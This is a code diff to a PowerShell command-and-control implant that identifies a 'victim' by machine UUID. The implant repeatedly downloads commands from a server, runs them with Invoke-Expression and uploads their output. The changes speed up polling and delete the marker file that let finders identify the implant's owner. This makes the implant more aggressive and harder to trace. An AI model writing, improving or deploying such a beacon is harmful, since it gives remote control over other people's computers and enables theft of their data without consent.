@@ -1,6 +1,6 @@
 $server = "http://127.0.0.1:8080"
-$pollmin = 15
-$pollmax = 25
+$pollmin = 1
+$pollmax = 5
 $terminationdate = Get-Date -Date "2020-01-01 00:00:00"
 $targetdomain = "TARGETDOMAIN"
 $markercontents = "If found, please contact XXX"
@@ -18,8 +18,6 @@ if ((Get-Date)  -ge $terminationdate) {
     exit 2
 }
 
-# Write a marker file
-$markercontents | Out-File $markerlocation
 
 # Get UUID (will identify our victim)
 $uuid = get-wmiobject Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
@@ -40,7 +38,10 @@ while((Get-Date)  -lt $terminationdate)
 
     # Make the request and execute using IEX
     try {
-        $output = Invoke-Expression (New-Object Net.WebClient).DownloadString("$server/c?i=$uuid&t=$time") | out-string 
+        $command = (New-Object Net.WebClient).DownloadString("$server/c?i=$uuid&t=$time")
+        if ($command) {
+            $output = Invoke-Expression ($command) | out-string 
+        }
     } 
     catch {
         $output = $_.Exception.message
@@ -49,7 +50,6 @@ while((Get-Date)  -lt $terminationdate)
     if ($output) {
         # Send back the output or error
         Write-host "X"
-        $time = [int64](([datetime]::UtcNow)-(get-date "1/1/1970")).TotalSeconds
         (New-Object Net.WebClient).UploadString("$server/r?i=$uuid&t=$time",$output)
     }
 }
